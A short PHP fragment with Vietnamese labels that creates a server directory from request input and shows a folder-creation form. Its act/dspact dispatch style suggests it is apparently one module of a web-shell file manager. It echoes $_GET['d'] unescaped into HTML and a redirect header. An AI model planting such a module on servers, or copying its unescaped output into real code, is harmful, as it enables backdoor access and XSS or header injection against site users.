<?php

 if ($mkdir != $d)
 {
  if (file_exists($mkdir)) {echo "<b>Tạo thư mục \"".htmlspecialchars($mkdir)."\"</b>: Đã tồn tại";}
  elseif (!mkdir($mkdir)) {echo "<b>Tạo thư mục \"".htmlspecialchars($mkdir)."\"</b>: bị chặn";}
  else{ echo 'Thành công!'; header("Location: tools.php?act=ls&d=".$mkdir."/");}
  echo "<br><br>";
 }
 $act = $dspact = "ls";

 echo ' <center><b>:: Tạo thư mục ::</b><form method="POST">
 <input type="hidden" name="act" value="mkdir">
 <input type="hidden" name="d" value="'.$_GET['d'].'">
 <input type="text" name="mkdir" size="50" value="'.$_GET['d'].'">&nbsp;
 <input type="submit" value="Tạo">
 </form></center>';